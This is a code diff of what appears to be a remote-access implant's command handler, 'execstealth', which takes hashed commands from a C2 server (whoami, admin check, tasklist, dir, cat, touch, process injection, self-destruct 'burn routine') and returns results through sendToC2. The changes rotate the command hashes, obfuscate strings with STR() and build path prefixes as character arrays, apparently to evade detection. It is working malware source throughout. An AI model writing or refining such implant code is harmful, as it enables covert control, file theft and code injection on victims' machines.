@@ -29,65 +29,80 @@ void execstealth(SOCKET s, char *cmd) {
     }    
 
     switch (nameHash) {
-        case 0XAD11030609498B4A:  //whoami
+        case 0xC10D6DEBB9DF5BD7:  //whoami
             {
             wchar_t username[256] = {0};
             user_id(username);
 
             if (wcslen(username) > 0) {
                 char response[512];
-                snprintf(response, sizeof(response), "Current User: %ls", username);
-
+                snprintf(response, sizeof(response), STR("Current User: %ls").get(), username);
                 sendToC2(response);
             }
             break;
         }
-        case 0X355DDC5C84536377:   //Privileges
+        case 0x290663888C0C6421:   //admin
             {
-            const char* result = IsAdmin() ? STR("Privileges: Administrator") : STR("Privileges: Standard User");
+            //const char* result = IsAdmin() ? STR("Privileges: Administrator") : STR("Privileges: Standard User");
 
-            sendToC2(result);
+            const char* result;
 
+            if(IsAdmin()){
+                sendToC2(STR("Privileges: Administrator"));
+            }else{
+                sendToC2(STR("Privileges: Standard User"));
+            }
+
+            //sendToC2(result);
 
             break;
          }
-        case 0X355DDC8DAC457854:  //check blacklisted process
+        case 0x1CBB08C04709D135:  //tasklist
             {
             GetProcessList();
             
             break;
             }      
 
-        case 0XF4BA6AD8BC294464:    //dir
+        case 0x0A45249A81624E12:    //dir
             {
                 if (arguments && strlen(arguments) > 0) {
-                    std::string fullPath = arguments;
-                    
-                    if (fullPath.find("\\??\\") == std::string::npos) {
-                        fullPath = "\\??\\" + fullPath;
+                    char fullPath[MAX_PATH] = {0};
+                    char ntPfx[] = {'\\','?','?','\\','\0'};
+                    // Check if path already has NT prefix
+                    if (strncmp(arguments, ntPfx, 4) != 0) {
+                        strcpy(fullPath, ntPfx);
+                        strcat(fullPath, arguments);
+                    } else {
+                        strncpy(fullPath, arguments, MAX_PATH - 1);
                     }
 
                     wchar_t wPath[MAX_PATH];
                     size_t outSize;
-                    mbstowcs_s(&outSize, wPath, fullPath.c_str(), MAX_PATH - 1);
+                    mbstowcs_s(&outSize, wPath, fullPath, MAX_PATH - 1);
                     Internal_Dir(wPath);
                 } else {
                     // Default path
-                    Internal_Dir(L"\\??\\C:\\");
+                    wchar_t defPath[] = {'\\','?','?','\\','C',':','\\','\0'};
+                    Internal_Dir(defPath);
                 }
             break;
             }
-        case 0XF4BA6AD8BC293F1D:    //cat
+        case 0x06350A5BC5E8425E:    //cat
             {
                 if (arguments && strlen(arguments) > 0) {
-                    std::string fullPath = arguments;
-                    if (fullPath.find("\\??\\") == std::string::npos) {
-                        fullPath = "\\??\\" + fullPath;
+                    char fullPath[MAX_PATH] = {0};
+                    char ntPfx[] = {'\\','?','?','\\','\0'};
+                    if (strncmp(arguments, ntPfx, 4) != 0) {
+                        strcpy(fullPath, ntPfx);
+                        strcat(fullPath, arguments);
+                    } else {
+                        strncpy(fullPath, arguments, MAX_PATH - 1);
                     }
 
                     wchar_t wPath[MAX_PATH];
                     size_t outSize;
-                    mbstowcs_s(&outSize, wPath, fullPath.c_str(), MAX_PATH - 1);
+                    mbstowcs_s(&outSize, wPath, fullPath, MAX_PATH - 1);
 
                     Internal_Read(wPath);
                 } else {
@@ -96,7 +111,7 @@ void execstealth(SOCKET s, char *cmd) {
             break;
             }
 
-        case 0XD0083F86CB0D9A8:     //touch
+        case 0x7D14B8DA3B95D39F:     //touch
             {
                 if (arguments && strlen(arguments) > 0) {
                     char pathPart[MAX_PATH] = {0};
@@ -109,14 +124,18 @@ void execstealth(SOCKET s, char *cmd) {
                         while (*dataPart == ' ') dataPart++;                     }
 
                     if (strlen(pathPart) > 0 && dataPart && strlen(dataPart) > 0) {
-                        std::string fullPath = pathPart;
-                        if (fullPath.find("\\??\\") == std::string::npos) {
-                            fullPath = "\\??\\" + fullPath;
+                        char fullPath[MAX_PATH] = {0};
+                        char ntPfx[] = {'\\','?','?','\\','\0'};
+                        if (strncmp(pathPart, ntPfx, 4) != 0) {
+                            strcpy(fullPath, ntPfx);
+                            strcat(fullPath, pathPart);
+                        } else {
+                            strncpy(fullPath, pathPart, MAX_PATH - 1);
                         }
 
                         wchar_t wPath[MAX_PATH];
                         size_t outSize;
-                        mbstowcs_s(&outSize, wPath, fullPath.c_str(), MAX_PATH - 1);
+                        mbstowcs_s(&outSize, wPath, fullPath, MAX_PATH - 1);
 
                         Internal_Write(wPath, dataPart);
                     } else {
@@ -125,7 +144,7 @@ void execstealth(SOCKET s, char *cmd) {
                 }
             break;
             }
-        case 0XAD110305E90B3762:    //inject
+        case 0x6A66A39F04965F16:    //inject
             {
                 if (arguments && strlen(arguments) > 0) {
                     char processName[MAX_PATH] = {0};
@@ -216,7 +235,7 @@ void execstealth(SOCKET s, char *cmd) {
             }
 
 
-        case 0X4F3163C61C79862B:
+        case 0x3C0EED1700AD16B3:    //suicide
             {
                 sendToC2(STR("Initiating burn routine"));
                 
